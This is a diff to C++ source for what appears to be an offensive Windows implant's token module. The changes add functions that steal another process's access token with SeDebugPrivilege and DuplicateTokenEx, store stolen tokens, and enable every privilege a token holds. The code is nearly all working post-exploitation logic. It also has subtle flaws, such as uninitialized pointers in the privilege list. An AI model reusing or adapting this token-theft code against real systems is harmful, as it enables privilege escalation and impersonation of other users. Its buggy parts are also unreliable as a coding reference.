@@ -161,63 +161,128 @@ auto DECLFN Token::Use(
     return Self->Advapi32.ImpersonateLoggedOnUser( TokenHandle ); 
 }
 
+auto DECLFN Token::Add(
+    _In_ HANDLE TokenHandle,
+    _In_ ULONG  ProcessID
+) -> TOKEN_NODE* {
+    if ( ! TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
+        return nullptr;
+    }
+
+    TOKEN_NODE* NewNode = (TOKEN_NODE*)Self->Hp->Alloc( sizeof(TOKEN_NODE) );
+    if ( ! NewNode ) {
+        return nullptr;
+    }
+
+    ULONG TokenID;
+    do {
+        TokenID = Rnd32() % 9999;
+    } while ( this->GetByID( TokenID ) );
+
+    NewNode->Handle    = TokenHandle;
+    NewNode->Host      = 0;
+    NewNode->ProcessID = ProcessID;
+    NewNode->User      = this->GetUser(TokenHandle);
+    NewNode->TokenID   = TokenID;
+    NewNode->Next      = nullptr;
+
+    if ( ! this->Node ) {
+        this->Node = NewNode; 
+    } else {
+        TOKEN_NODE* Current = this->Node;
+        while (Current->Next) {
+            Current = Current->Next;
+        }
+        Current->Next = NewNode; 
+    }
+
+    return NewNode;
+}
+
+auto DECLFN Token::ListPrivs(
+    _In_  HANDLE  TokenHandle,
+    _Out_ ULONG  &ListCount
+) -> PVOID {
+    ULONG             TokenInfoLen = 0;
+    TOKEN_PRIVILEGES* TokenPrivs   = nullptr;
+    PRIV_LIST**       PrivList     = nullptr;
+
+    Self->Advapi32.GetTokenInformation( TokenHandle, TokenPrivileges, nullptr, 0, &TokenInfoLen );
+
+    TokenPrivs = (TOKEN_PRIVILEGES*)Self->Hp->Alloc( TokenInfoLen );
+    if ( ! TokenPrivs ) return nullptr;
+
+    if ( ! Self->Advapi32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, TokenInfoLen, &TokenInfoLen ) ) {
+        return nullptr;
+    }
+
+    ListCount = TokenPrivs->PrivilegeCount;
+    PrivList  = (PRIV_LIST**)Self->Hp->Alloc( sizeof( PRIV_LIST ) * ListCount );
+
+    for ( INT i = 0; i < ListCount; i++ ) {
+        LUID  luid     = TokenPrivs->Privileges[i].Luid;
+        ULONG PrivLen  = MAX_PATH;
+        CHAR* PrivName = (CHAR*)Self->Hp->Alloc( PrivLen );
+
+        Self->Advapi32.LookupPrivilegeNameA( nullptr, &luid, PrivName, &PrivLen );
+
+        PrivList[i]->PrivName   = PrivName;
+        PrivList[i]->Attributes = TokenPrivs->Privileges[i].Attributes;
+    }
+
+    Self->Hp->Free( TokenPrivs );
+
+    return PrivList;
+}
+
+auto DECLFN Token::GetPrivs(
+    _In_ HANDLE TokenHandle
+) -> BOOL {
+    ULONG PrivListLen = 0;
+    PVOID PrivList    = nullptr;
+
+    PrivList = this->ListPrivs( TokenHandle, PrivListLen );
+
+    for ( INT i = 0; i < PrivListLen; i++ ) {
+        if ( ! this->SetPriv( TokenHandle, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName ) ) return FALSE;
+    }
+
+    return TRUE;
+}
+
 auto DECLFN Token::Steal(
     _In_ ULONG ProcessID
 ) -> TOKEN_NODE* {
-    HANDLE      TokenHandle   = INVALID_HANDLE_VALUE;
-    HANDLE      ProcessHandle = INVALID_HANDLE_VALUE;
-    TOKEN_NODE* NewNode       = nullptr;
+    HANDLE      TokenHandle     = INVALID_HANDLE_VALUE;
+    HANDLE      TokenDuplicated = INVALID_HANDLE_VALUE;
+    HANDLE      ProcessHandle   = INVALID_HANDLE_VALUE;
+    TOKEN_NODE* NewNode         = nullptr;
 
     if ( TokenHandle = this->CurrentPs() ) {
-        KH_DBG_MSG
         this->SetPriv( TokenHandle, "SeDebugPrivilege" );
-        KH_DBG_MSG
         Self->Ntdll.NtClose( TokenHandle ); TokenHandle = nullptr;
     }
 
     ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
     if ( ! ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) {
-        KH_DBG_MSG
-        goto CLEANUP;
+        goto _KH_END;
     }
 
     if ( ! this->ProcOpen( ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle ) ||
         TokenHandle == INVALID_HANDLE_VALUE) {
-        KH_DBG_MSG
-        goto CLEANUP;
+        goto _KH_END;
     }
 
-    NewNode = (TOKEN_NODE*)Self->Hp->Alloc( sizeof( TOKEN_NODE ) );
-    if ( ! NewNode ) {
-        goto CLEANUP;
-    }
+    Self->Ntdll.NtClose( ProcessHandle );
 
-    ULONG TokenID;
-
-    do {
-        TokenID = Rnd32() % 9999;
-    } while ( this->GetByID( TokenID ) ); 
-
-    NewNode->Handle    = TokenHandle;
-    NewNode->Host      = Self->Machine.CompName;
-    NewNode->ProcessID = ProcessID;
-    NewNode->User      = this->GetUser( TokenHandle );
-    NewNode->TokenID   = TokenID;
-    NewNode->Next      = nullptr;
-
-    if ( ! this->Node ) {
-        this->Node = NewNode;
+    if ( Self->Advapi32.DuplicateTokenEx( TokenHandle, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenImpersonation, &TokenDuplicated ) ) {
+        Self->Ntdll.NtClose( TokenHandle );
+        return this->Add( TokenDuplicated, ProcessID );
     } else {
-        TOKEN_NODE* LastNode = this->Node;
-        while ( LastNode->Next ) {
-            LastNode = LastNode->Next;
-        }
-        LastNode->Next = NewNode;
+        return this->Add( TokenHandle, ProcessID );
     }
 
-    return NewNode;
-
-CLEANUP:
+_KH_END:
     if ( TokenHandle != INVALID_HANDLE_VALUE ) {
         Self->Ntdll.NtClose( TokenHandle );
     }
@@ -229,6 +294,7 @@ CLEANUP:
     if ( NewNode ) {
         Self->Hp->Free( NewNode );
     }
+
     return nullptr;
 }
 
